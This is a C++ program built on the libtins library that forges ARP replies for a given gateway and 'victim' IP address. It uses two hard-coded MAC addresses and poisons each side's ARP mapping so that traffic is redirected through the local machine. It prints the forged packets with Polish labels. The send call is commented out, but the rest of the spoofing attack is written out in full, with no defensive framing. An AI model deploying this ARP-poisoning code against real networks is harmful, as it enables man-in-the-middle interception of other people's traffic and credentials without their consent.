#include <iostream>
#include <string>
#include <stdexcept>
#include <cstdlib>
#ifdef _WIN32
    #define WIN32_LEAN_AND_MEAN
    #include <windows.h>
#else
    #include <unistd.h>
#endif // _WIN32
#include <tins/arp.h>
#include <tins/network_interface.h>
#include <tins/utils.h>
#include <tins/ethernetII.h>
#include <tins/packet_sender.h>
#include <tins/hw_address.h>

using std::cout;
using std::runtime_error;
using std::endl;

using namespace Tins;


int main(int argc, char* argv[]) {

    if (argc != 3) {
        cout << "Usage: " <<* argv << " <Gateway> <Victim>" << endl;
        return 1;
    }
    IPv4Address gw, victim;
    EthernetII::address_type own_hw;
    try {
        // Convert dotted-notation ip addresses to integer. 
        gw     = argv[1];
        victim = argv[2];
    }
    catch (...) {
        cout << "Invalid ip found...\n";
        return 2;
    }

    NetworkInterface iface;
    NetworkInterface::Info info;
    try {
        // Get the interface which will be the gateway for our requests.
        iface = gw;
        // Lookup the interface id. This will be required while forging packets.
        // Find the interface hardware and ip address.
        info = iface.addresses();
    }
    catch (runtime_error& ex) {
        cout << ex.what() << endl;
        return 3;
    }
    
    PacketSender sender;
    EthernetII::address_type gw_hw, victim_hw;

    gw_hw = HWAddress<6> ("4c:4e:03:43:5e:ca");
    victim_hw = HWAddress<6> ("90:78:b2:ab:5b:b1");

    
    ARP gw_arp(gw, victim, gw_hw, info.hw_addr), 
        victim_arp(victim, gw, victim_hw, info.hw_addr);
    
    EthernetII to_gw = EthernetII(gw_hw, info.hw_addr) / gw_arp;
    EthernetII to_victim = EthernetII(victim_hw, info.hw_addr) / victim_arp;
    
    const ARP &ofiara = to_victim.rfind_pdu<ARP>();
    const ARP &brama = to_gw.rfind_pdu<ARP>();
    std::cout<<"\nARP:\nAdres źrodła: "<<ofiara.sender_ip_addr()<<" "<<ofiara.sender_hw_addr()<<" Adres urządzenia docelowego: "<<ofiara.target_ip_addr()<<" "<<ofiara.target_hw_addr()<<'\n';
    std::cout<<"\nARP:\nAdres źrodła: "<<brama.sender_ip_addr()<<" "<<brama.sender_hw_addr()<<" Adres urządzenia docelowego: "<<brama.target_ip_addr()<<" "<<brama.target_hw_addr()<<'\n';

    //sender.send(to_victim, iface);
}